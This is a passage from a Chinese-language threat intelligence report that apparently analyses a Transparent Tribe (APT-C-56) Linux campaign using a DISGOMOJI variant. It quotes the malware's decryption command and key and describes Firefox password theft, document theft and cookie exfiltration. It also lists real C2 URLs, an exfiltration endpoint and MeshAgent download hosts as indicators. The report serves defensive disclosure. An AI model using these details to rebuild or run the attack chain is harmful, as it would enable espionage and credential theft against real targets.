&#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span style=""><span leaf="">文件大小</span><span lang="EN-US"><o:p></o:p></span></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid windowtext;border-right: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span leaf="">1.91 MB (2,012,048 </span></span><span style=""><span leaf="">字节</span><span lang="EN-US"><span leaf="">)</span><o:p></o:p></span></span></p></td></tr><tr style="mso-yfti-irow:3;mso-yfti-lastrow:yes;"><td data-colwidth="94" width="94" valign="top" style="border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-left: 1pt solid windowtext;border-image: initial;border-top: none;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span style=""><span leaf="">文件类型</span><span lang="EN-US"><o:p></o:p></span></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid windowtext;border-right: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;" data-mpa-action-id="mbhk0xt1e3g"><span lang="EN-US" style=""><span leaf="">ELF</span><o:p></o:p></span></p></td></tr></tbody></table>  
  
“ec”文件是一个加解密器，主要功能是加密或者解密指定的文件，“-d”选项表示解密指定文件，“-f”选项表示待处理的文件，“-k”用于指定AES秘钥。“ec”依次使用RC4和两次AES算法进行解密。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrO9dqrxNjD9acS5OdyEZZ7UBY7QTMPyv5Eq4PXKIdh8yyNQ7063CowS6iaoVq9TEXMIPfk2SSk56Q/640?wx_fmt=png "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
  
“intermediate”是一个Golang编译的ELF文件，部分功能和“Password”相同。“intermediate”文件信息如下：  
  
<table><tbody><tr><td data-colwidth="94" width="94" valign="top" style="border: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20pt;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span leaf="">MD5</span><o:p></o:p></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: 1pt solid windowtext;border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-image: initial;border-left: none;padding: 0cm 5.4pt;"><p style="line-height: 20pt;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span leaf="">d24c797f94933a3ec5227a6f57e15358</span><o:p></o:p></span></p></td></tr><tr><td data-colwidth="94" width="94" valign="top" style="border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-left: 1pt solid windowtext;border-image: initial;border-top: none;padding: 0cm 5.4pt;"><p style="line-height: 20pt;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span style=""><span leaf="">文件名称</span><span lang="EN-US"><o:p></o:p></span></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid windowtext;border-right: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20pt;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span leaf="">intermediate</span></span><span lang="EN-US" style=""><o:p></o:p></span></p></td></tr><tr><td data-colwidth="94" width="94" valign="top" style="border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-left: 1pt solid windowtext;border-image: initial;border-top: none;padding: 0cm 5.4pt;"><p style="line-height: 20pt;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span style=""><span leaf="">文件大小</span><span lang="EN-US"><o:p></o:p></span></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid windowtext;border-right: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20pt;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span leaf="">5.86 MB (6,151,759 </span></span><span style=""><span leaf="">字节</span><span lang="EN-US"><span leaf="">)</span><o:p></o:p></span></span></p></td></tr><tr><td data-colwidth="94" width="94" valign="top" style="border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-left: 1pt solid windowtext;border-image: initial;border-top: none;padding: 0cm 5.4pt;"><p style="line-height: 20pt;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span style=""><span leaf="">文件类型</span><span lang="EN-US"><o:p></o:p></span></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid windowtext;border-right: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20pt;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;" data-mpa-action-id="mbhk13fm1lui"><span lang="EN-US" style=""><span leaf="">ELF</span><o:p></o:p></span></p></td></tr></tbody></table>  
  
“intermediate”会在“/etc/systemd/system/”目录下创建一个名为“x96sockets-service.sh”的sh文件，该sh文件的主要功能为从和上述相同的GoogleDrive地址下载“x96coreino”和“ec”文件，保存在“/opt/.x96_32-linux-gnu”目录下，并使用“./ec  
  
   
-f x96coreinfo -d -k 'Kavach0fficialDB'”命令解密“x96coreinfo”文件。和之前解密“x96coreinfo”文件的秘钥(TedtempNahihy!)不同，本次使用的秘钥（Kavach0fficialDB）能成功解密“x96coreinfo”文件。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrO9dqrxNjD9acS5OdyEZZ7ibUMU5xumrCICoYgXh2SsoI9AgNnHKk3VrcicRsKmRHT4FCmnFZWibVAQ/640?wx_fmt=png "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
  
通过服务的方式进行持久化驻留。通过层层的下载，解密，持久化驻留，并且在多个组件中都在下载解密操作，展现出整个攻击链较高的容错率。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrO9dqrxNjD9acS5OdyEZZ77icaIYquQFIVFia2TU0vCmU0E8SSvtp8RJPahbEzicuBe0L742tvpn9gg/640?wx_fmt=png "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
## 3.攻击组件分析  
  
x96coreinfo是本次攻击所使用的最终的载荷，具体信息如下：  
  
<table><tbody><tr style="mso-yfti-irow:0;mso-yfti-firstrow:yes;"><td data-colwidth="94" width="94" valign="top" style="border: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span leaf="">MD5</span><o:p></o:p></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: 1pt solid windowtext;border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-image: initial;border-left: none;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span leaf="">c8c21b4642f12c28f6e5e0389bbf8c36</span><o:p></o:p></span></p></td></tr><tr style="mso-yfti-irow:1;"><td data-colwidth="94" width="94" valign="top" style="border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-left: 1pt solid windowtext;border-image: initial;border-top: none;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span style=""><span leaf="">文件名称</span><span lang="EN-US"><o:p></o:p></span></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid windowtext;border-right: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span leaf="">x96coreinfo</span></span><span lang="EN-US" style=""><o:p></o:p></span></p></td></tr><tr style="mso-yfti-irow:2;"><td data-colwidth="94" width="94" valign="top" style="border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-left: 1pt solid windowtext;border-image: initial;border-top: none;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span style=""><span leaf="">文件大小</span><span lang="EN-US"><o:p></o:p></span></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid windowtext;border-right: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span leaf="">16.6 MB (17,472,457 </span></span><span style=""><span leaf="">字节</span><span lang="EN-US"><span leaf="">)</span><o:p></o:p></span></span></p></td></tr><tr style="mso-yfti-irow:3;mso-yfti-lastrow:yes;"><td data-colwidth="94" width="94" valign="top" style="border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-left: 1pt solid windowtext;border-image: initial;border-top: none;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span style=""><span leaf="">文件类型</span><span lang="EN-US"><o:p></o:p></span></span></p></td><td data-colwidth="331" width="331" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid windowtext;border-right: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;" data-mpa-action-id="mbhk1b0xjls"><span lang="EN-US" style=""><span leaf="">ELF</span><o:p></o:p></span></p></td></tr></tbody></table>  
  
x96coreinfo是最终的攻击组件，本次使用的最终攻击组件使用Google Cloud Platform（GCP）用作C2服务，通过配置信息中的服务账户密钥用于GCP 的身份验证和授权，以此实现数据传输，攻击组件中的云平台服务账户密钥信息如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrO9dqrxNjD9acS5OdyEZZ7KZwKnyPtjib1CGYKMJW8pKgt37nmWJia6SSjTL2ZSlqUjPZf2M2WhfEA/640?wx_fmt=png "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
  
首先，x96coreinfo会获取局域网IP，广域网IP以及MAC地址等信息，系统标志等信息发送给GCP。随后接收并解密返回的命令并执行。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrO9dqrxNjD9acS5OdyEZZ70Q6uFeQibZmXoFk4NWBtuicYZmk6LwvXlqS1PvtB4Wdm6q46BLUOkBibw/640?wx_fmt=png "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
  
接着，x96coreinfo使用开源项目“firefox_decrypt”来获取Firefox相关产品的密码，并将获取到的密码文件上传到攻击者控制的谷歌云平台。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrO9dqrxNjD9acS5OdyEZZ7v3ZibicqWaTCOXBTiafX8Cq2VFoZt9GHH7n7zsJp8OfDJcYhib2s23dPZg/640?wx_fmt=png "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
然后窃取当前工作目录下后缀为“.doc”，“.docx”，“.pdf”“.xls”，“.xlsx”，“.ppt”,“.pptx”,“.jpg”,“.jpeg”，“.png”,“.odt”，“.ods”，“.odp”文件，然后也用同样的方式上传到谷歌云平台。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrO9dqrxNjD9acS5OdyEZZ7XqqRqn1oASn8rJ1OXvujFLGJI6xH58mQzudbRWpT8N5LQNl3mibVukA/640?wx_fmt=png "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
除此之外，攻击者还将存放在远程链接上的“firefox_portable.zip”保存到/opt/firefox.zip。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrO9dqrxNjD9acS5OdyEZZ7cNblUcDgvdRM0vXfXbVcDHF2LfSVdh9HHTXibrv08YBSkXyWWY4rXcg/640?wx_fmt=png "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
  
       
下载的zip是伪装firefox的安装包（md5:  
  
2d9fb9303512a6b6e9a67c4d956a0e07）,其具备正常的firefox功能。只是在安装包firefox_portable\firefox\Extension对应扩展目录中加载了一个恶意background.js，其正常的firefox安装包默认没有这个js文件。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrO9dqrxNjD9acS5OdyEZZ7Ift79WhRZqMNvc3X3C7rm8cx5q5E2lKOQCfLXJoiaP8Y2CBiaVZwibkeg/640?wx_fmt=png "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
  
其具体功能是监控受害者是否访问带有https://email.gov.in等字符串的网站，如果是，则盗取uuid以及cookies至http://46.202.153.236/cookies-handler.php。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrO9dqrxNjD9acS5OdyEZZ7nGYZicW3ZjtiagdASCd4keO1wqLucrCPk8Rvqy8RVUt3I3Y9zLNzibuWg/640?wx_fmt=png "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
  
此后，攻击者还会通过执行位于远程地址(saadac3.accesscam.org)上的MeshAgent脚本安装MeshAgent远程设备管理器，以便长期控制受害者。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrO9dqrxNjD9acS5OdyEZZ7FwWEOZnnCqeROayEb1OqfEHHu3HP9cFFYMQPncCgVgmibeH4ib22Qvxg/640?wx_fmt=png "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
![]( "")  
  
  
需要特别说明的是：除了本次攻击链中所使用的名为“x96coreinfo”的攻击载荷，我们还关联到了名为“x56coreinfo”攻击载荷，该文件和“x96coreinfo”相比，功能大体一致，只是没有添加函数名混淆。也体现了攻击者在努力地更新自己的武器库。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6CNEHNicic4PrO9dqrxNjD9acS5OdyEZZ77IEQs1iaOfBtSzgEV2R0jvzmXaYPVxqXdnHlS3ICGD5Hv8dovll4JKg/640?wx_fmt=png&from=appmsg "")  
  
 二、  
  
归属研判   
  
通过对本次攻击活动的相关信息进行深入分析，我们认为此类攻击活动符合透明部落组织以往的TTP，具体表现有以下方面：            
  
1、使用谷歌云端硬盘下载后续载荷  
[1]  
，这样通信具备隐蔽性，并且无需自建C2服务器，降低成本和暴露风险；  
  
2、下载DISGOMOJI变体功能与之前发现的载荷也比较类似，只是之前的DISGOMOJI使用的是Discord服务器，而本次使用的是谷歌云服务进行通信,此外，在载荷混淆方式上进行了升级；   
  
3、载荷存放目录命名上跟之前攻击活动中也较类似，具体如下：  
  
<table><tbody><tr style="mso-yfti-irow:0;mso-yfti-firstrow:yes;"><td data-colwidth="90" width="217" valign="top" style="border: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span style=""><span leaf="">本次目录</span><span lang="EN-US"><o:p></o:p></span></span></p></td><td data-colwidth="249" width="246" valign="top" style="border-top: 1pt solid windowtext;border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-image: initial;border-left: none;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span lang="EN-US" style=""><span leaf="">$HOME/.x96_32-linux-gnu/</span><o:p></o:p></span></p></td></tr><tr style="mso-yfti-irow:1;mso-yfti-lastrow:yes;"><td data-colwidth="90" width="217" valign="top" style="border-right: 1pt solid windowtext;border-bottom: 1pt solid windowtext;border-left: 1pt solid windowtext;border-image: initial;border-top: none;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;"><span style=""><span leaf="">之前目录</span><span lang="EN-US"><o:p></o:p></span></span></p></td><td data-colwidth="249" width="246" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid windowtext;border-right: 1pt solid windowtext;padding: 0cm 5.4pt;"><p style="line-height: 20.0pt;mso-line-height-rule: exactly;font-size: 16px;font-family: &#34;mp-quote&#34;, -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;" data-mpa-action-id="mbhjzddz3i5"><span lang="EN-US" style=""><span leaf="">$HOME/.x86_32-linux-gnu/</span><o:p></o:p></span></p></td></tr></tbody></table>  
  
此外，该组织经常针对Linux系统进行攻击，再结合样本上传地为印度地区，以及在代码针对印度政府网站有监控的行为，这些都符合该组织攻击对象，因此，将其归属于APT-C-56（透明部落）组织。  
##   
  
**总结**  
  
  
本次披露样本与之前披露样本属于同类型样本，但是样本与之前有所差异，是未被披露过的相关样本。该类型样本结构相对复杂，载荷更新也较快，需要引起足够的重视。  
  
由于边界、文化、民族及历史等因素，印巴之间的冲突长期存在，地缘矛盾引发的军事与政治情报刺探活动频发，因此该地区的APT组织攻击行为尤为活跃。透明部落主要以印度军方人员及政府官员为目标，实施精准的定向攻击。本次攻击诱导受害者执行password打开加密的pdf文档，显示密码的同时会静默下载解密出DISGOMOJI变体木马程序，本次变体采用了与谷歌云服务的通信方式而不是之前版本与Discord通信的方式，并且函数名进行了混淆，这表明该组织在持续地进行更新恶意代码形态。由于Linux系统在印度政府中被广泛使用，相信该组织后续会针对Linux系统开发出更多的攻击武器。  
  
因此在这里提醒用户加强安全意识，无论何种操作系统，切勿执行未知样本或点击来历不明的链接等操作。这些行为可能导致系统在没有任何防范的情况下被攻陷，从而导致机密文件和重要情报的泄漏。  
  
  
**附录 IOC**  
  
MD5：  
  
452cd18570471e80dd6bf34addede334  
  
d5a3766e744a563278b18267d6bd7113  
  
c763ecf315481525afcd47c5f32c1fd7  
  
68fbe197c62a3777d2299f9eabed2c70  
  
43e4260c595b20e357be75c0c1fbec29  
  
d24c797f94933a3ec5227a6f57e15358  
  
c8c21b4642f12c28f6e5e0389bbf8c36  
  
e429ebfbc827ac8a865dce20470d3e8b  
  
fe7bb6d0835879043e4b9fef7fa59375  
  
1a17955be2f99813c03d9f4970131593  
  
2d9fb9303512a6b6e9a67c4d956a0e07  
  
C2&URL:  
  
https://drive.google[.]com/uc?export=download&id=1ZreMbUude-F2zLWWeO2FNiKU7I7v7aSe  
  
https://drive.google[.]com/uc?export=download&id=1Mjb0yaFvUTREFAFKaPYpaJdrMHso_Fp-  
  
https://drive.google[.]com/uc?export=download&id=1pTsXCIZByamTPV9qVdaYRVv87o0nf0mL  
  
https://drive.google[.]com/uc?export=download&id=1s8VJ_ix5k-hSPwAiWYJMd6TrClWYtZQI  
  
https://drive.google[.]com/uc?export=download&id=1hXrn-AQlVEPeNHkjLDw-Cj6uuZ1sNiwr  
  
https://drive.usercontent.google[.]com/download?id=1iYpTG9y_J2BuUTiIMtn0BMHgYU3Zrm6n  
  
https://drive.google[.]com/uc?export=download&id=1MZqE1kIo6Q5eI2CQ0o8dGWHxGVIzzBM4  
  
https://drive.google[.]com/uc?export=download&id=1KK45pYzBF5CF6hO_iw0MMMPZUEIy4fR7  
  
https://saadac3.accesscam[.]org/meshagents?id=JEV2YwGY8a5qG5mKayrgQgvzlPXkeCeYbGDYA2Nkwch8VIoaRSQtV3CbSsHBfnB4&installfl  
  
https://saadac2.mywire[.]org/meshagents?script=1  
  
https://drive.usercontent.google[.]com/download?id=1TqPzjwvRirB5U_V9NNjhpYC53hYtd4qu&export=download&authuser=0&confirm=t&uuid=cd9cfd85-7c03-477a-9fb0-4ad21f57&at=AEz70l609I4DMbUNVtlLPPytmQA-%3A1742974814202  
  
http://46.202.153[.]236/cookies-handler.php  
  
  
**参考**  
  
[1]  
  
https://www.seqrite.com/blog/umbrella-of-pakistani-threats-converging-tactics-of-cyber-operations-targeting-india/  
  
    
  
